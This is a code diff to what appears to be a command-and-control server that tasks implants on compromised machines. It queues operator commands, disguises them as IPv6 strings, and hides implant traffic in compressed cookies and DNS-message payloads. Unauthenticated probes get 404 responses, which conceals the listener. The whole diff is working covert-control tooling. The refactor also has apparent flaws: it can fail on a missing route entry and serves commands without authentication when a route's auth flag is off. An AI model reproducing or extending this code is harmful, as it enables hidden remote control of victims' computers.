@@ -83,7 +83,14 @@ def get_routes():
             route_status[path] = {}
         if name not in route_status[path]:
             route_status[path][name] = {}
-        route_status[path][name][method] = listener['enabled'].lower() == "true"  # Store as True or False
+        # Store as true/false if the method for the route is enabled
+        # Gets the route enabled status, if auth is required, and if it's using compression
+        route_status[path][name][method] = {
+            'enabled': listener['enabled'].lower() == "true",
+            'auth': listener.get('auth', 'false').lower() == "true",  # Default to 'false' if 'auth' key is missing
+            'comp': listener.get('comp', 'false').lower() == "true"  # Same with 'comp'
+        }
+    print(route_status)
 
     for listener in config["custom_listeners"]:
         name = listener['name']
@@ -113,25 +120,6 @@ def register_blueprints(new_bp):
     # Refresh the route list for enabled/disabled states
     get_routes()
     logger.info(f"new blueprint registered: {new_bp}")
-
-
-def find_get_val(req_meth):
-    """
-    A dirty function to search a dictionary for the method and status
-    :param req_meth: The request method
-    :return: Bool
-    """
-    stack = [route_status]
-
-    while stack:
-        current_dict = stack.pop()
-
-        for key, value in current_dict.items():
-            if isinstance(value, dict):
-                stack.append(value)
-            elif key == req_meth and value is False:
-                return True
-    return False
 
 
 def verify_auth_token(uri, received_token, received_timestamp):
@@ -288,17 +276,28 @@ def get_results(user_id):
 
 def get_results_by_implant(user_id, implant_id):
     """
-    Get and remove the entry for a specific implant_id under a specific user.
+    Get and remove the oldest entry for a specific implant_id under a specific user.
+    If there are no items remaining, remove the key for that user.
+
     :param user_id: The user ID to search within.
     :param implant_id: The implant ID to fetch and remove the entry for.
     :return: The entry value if found and removed, or None.
     """
     user_results = result_storage.get(user_id, [])
+
     for dict_store in user_results:
         if implant_id in dict_store:
-            logger.info("Found the matching implant_id, retrieve lump_result")
-            lump_result = dict_store[implant_id]
+            logger.info("Found the matching implant_id, retrieving and removing result")
+            lump_result = dict_store.pop(implant_id, (None, None))  # Return a tuple if not found
             result, set_command = lump_result
+
+            if not dict_store:
+                user_results.remove(dict_store)
+
+                # If the user's result list is now empty, remove the user_id from result_storage
+                if not user_results:
+                    result_storage.pop(user_id, None)
+
             return f"Command > '{set_command}' Result > '{result}'"
 
     return "No matching entry found", None
@@ -504,18 +503,29 @@ def register_routes():
     def def_endpoint1():
         """
         Verifies requests for commands with an HMAC and shared key
-        :param get_imp_id: This represents the implant ID
         :return: Either the waiting command or error
         """
         # The PSK used for the HMAC
         imp_psk1 = imp_conf["psk1"]
-        logger.info("GET incoming for authenticated listener URI")
-        if request.cookies.get("da"):
-            # Get the cookie holding the compressed data
-            url_decoded_data = request.cookies.get("da")
-            logger.info("looks like an encoded request")
+
+        base_uri = request.path.split("/")
+        root_path = "/" + base_uri[1]
+        route_info = None
+        # Loop through possible route names under the path
+        for name, methods in route_status.get(root_path, {}).items():
+            route_info = methods.get(request.method)
+            if route_info:
+                logger.info(f"route info found: {route_info} for {name}")
+                break
+        comp = route_info.get('comp', False)
+
+        if comp:
+            logger.info(f"listener using compression for {request.method}")
+
+            logger.info(f"{request.method} incoming for listener URI")
+            cookie_value = next(iter(request.cookies.values()))
             logger.info("got cookies")
-            url_decoded_data = url_decoded_data.rstrip("=")  # Remove existing padding
+            url_decoded_data = cookie_value.rstrip("=")  # Remove existing padding
             padding = len(url_decoded_data) % 4
             if padding:
                 url_decoded_data += "=" * (4 - padding)  # Add necessary padding
@@ -525,52 +535,42 @@ def register_routes():
             unparsed_query = decompressed_data.decode('utf-8')
             parsed_data = urllib.parse.parse_qs(unparsed_query)
 
-            rcv_timestamp = parsed_data.get('timestamp')
-            rcv_token = parsed_data.get('token')
             get_imp_id = parsed_data.get('id')
-            logger.info("got the token and timestamp from cookies")
-            logger.info(f"info: {rcv_token}, {rcv_timestamp}, {get_imp_id}")
-            if verify_auth_token(get_imp_id[0], rcv_token[0], rcv_timestamp[0]) is True:
-                operator, command = get_waiting_command(get_imp_id[0])
-                if operator and command is False:
-                    logger.error("operator and command in queue returned as false")
-                    return "error"
-                checkout_command(get_imp_id[0], operator, command)
-                command = json.dumps(ipv6_encoder.string_to_ipv6(command))
-                logger.info("sending command and HMAC to implant")
-                hmac_k = hmac.new(imp_psk1.encode(), command.encode(), hashlib.sha256)
-                hmac_sig = hmac_k.hexdigest()
-                return jsonify(
-                    message=command,
-                    key=hmac_sig
-                )
-            else:
-                logger.error(f"error: verify_auth_token failed")
-                abort(404)
-        else:
+
+            operator, command = get_waiting_command(get_imp_id[0])
+            if operator and command is False:
+                logger.error("operator and command in queue returned as false")
+                return "error"
+            checkout_command(get_imp_id[0], operator, command)
+            command = json.dumps(ipv6_encoder.string_to_ipv6(command))
+            logger.info("sending command and HMAC to implant")
+            hmac_k = hmac.new(imp_psk1.encode(), command.encode(), hashlib.sha256)
+            hmac_sig = hmac_k.hexdigest()
+            return jsonify(
+                message=command,
+                key=hmac_sig
+            )
+
+        elif not comp:
             logger.info("uncompressed data")
             rcv_timestamp = request.cookies.get('timestamp')
             rcv_token = request.cookies.get('token')
             get_imp_id = request.cookies.get('id')
             logger.info("got the token and timestamp from cookies")
             logger.info(f"info: {rcv_token}, {rcv_timestamp}, {get_imp_id}")
-            if verify_auth_token(get_imp_id, rcv_token, rcv_timestamp) is True:
-                operator, command = get_waiting_command(get_imp_id)
-                if operator and command is False:
-                    logger.error("operator and command in queue returned as false")
-                    return "error"
-                checkout_command(get_imp_id, operator, command)
-                command = json.dumps(ipv6_encoder.string_to_ipv6(command))
-                logger.info("sending command and HMAC to implant")
-                hmac_k = hmac.new(imp_psk1.encode(), command.encode(), hashlib.sha256)
-                hmac_sig = hmac_k.hexdigest()
-                return jsonify(
-                    message=command,
-                    key=hmac_sig
-                )
-            else:
-                logger.info("verifying auth failed")
-                abort(404)
+            operator, command = get_waiting_command(get_imp_id)
+            if operator and command is False:
+                logger.error("operator and command in queue returned as false")
+                return "error"
+            checkout_command(get_imp_id, operator, command)
+            command = json.dumps(ipv6_encoder.string_to_ipv6(command))
+            logger.info("sending command and HMAC to implant")
+            hmac_k = hmac.new(imp_psk1.encode(), command.encode(), hashlib.sha256)
+            hmac_sig = hmac_k.hexdigest()
+            return jsonify(
+                message=command,
+                key=hmac_sig
+            )
 
 
     @app.route(listeners_list[1]['path'], methods=['POST'])
@@ -590,6 +590,7 @@ def register_routes():
             handle_update(operator, imp_id, result, set_command)
             return "200"
         elif request.content_type == "application/dns-message":
+            logger.info("dns PTR request used for data sent to us")
             dns_query = request.data
             name_list = []
             # Parse the DNS query using dnslib
@@ -657,12 +658,66 @@ def restrict_routes():
     root_path = "/" + base_uri[1]
     logger.info(f"checking if route is enabled: {root_path} {request.method}")
 
-    # Check if the request path matches a disabled route
-    if request.url_rule is None or root_path in route_status:
-        # Check if they return true/false
-        if find_get_val(request.method):
+    route_info = None
+    # Loop through possible route names under the path
+    for name, methods in route_status.get(root_path, {}).items():
+        route_info = methods.get(request.method)
+        if route_info:
+            logger.info(f"route info found: {route_info} for {name}")
+            break
+
+    if route_info:
+        auth = route_info.get('auth', False)
+        comp = route_info.get('comp', False)
+        # Check if the route is disabled
+        if not route_info.get('enabled', False):
             logger.warning(f"disabled route accessed: {request.path} {request.method}")
-            abort(404)  # Return a 404 if the route is disabled
+            abort(404)
+
+        # Check if the route requires authentication
+        if auth and not comp:
+            logger.info(f"auth required for route: {request.path} {request.method}")
+            logger.info("expecting uncompressed data")
+            # Route requires an auth check
+            # Determine if request is compressed or uncompressed
+            # If compressed is set as enabled in listener,
+            # Only expect one cookie regardless of name, just get the first one
+            # If uncompressed, get the cookie values by literal ID
+            rcv_timestamp = request.cookies.get('timestamp')
+            rcv_token = request.cookies.get('token')
+            get_imp_id = request.cookies.get('id')
+            logger.info("got the token and timestamp from cookies")
+            if verify_auth_token(get_imp_id, rcv_token, rcv_timestamp) is True:
+                logger.info("route auth check success")
+                pass
+            else:
+                abort(404)
+        elif auth and comp:
+            logger.info(f"auth required for route: {request.path} {request.method}")
+            logger.info("expecting compressed data on a random cookie")
+            # Get the first cookie
+            cookie_value = next(iter(request.cookies.values()))
+            logger.info("got cookies")
+            url_decoded_data = cookie_value.rstrip("=")  # Remove existing padding
+            padding = len(url_decoded_data) % 4
+            if padding:
+                url_decoded_data += "=" * (4 - padding)  # Add necessary padding
+
+            compressed_data = base64.b64decode(url_decoded_data)
+            decompressed_data = zlib.decompress(compressed_data)
+            unparsed_query = decompressed_data.decode('utf-8')
+            parsed_data = urllib.parse.parse_qs(unparsed_query)
+
+            rcv_timestamp = parsed_data.get('timestamp')
+            rcv_token = parsed_data.get('token')
+            get_imp_id = parsed_data.get('id')
+            logger.info("got the token and timestamp from cookies")
+            logger.info(f"info: {rcv_token}, {rcv_timestamp}, {get_imp_id}")
+            if verify_auth_token(get_imp_id[0], rcv_token[0], rcv_timestamp[0]) is True:
+                logger.info("verified the auth token")
+                pass
+            else:
+                abort(404)
 
 
 def start_flask():
@@ -681,6 +736,7 @@ def start_server():
     # Start the Flask server in a separate thread
     flask_thread = Thread(target=start_flask)
     flask_thread.start()
+    get_routes()
 
     # Create and bind the socket
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
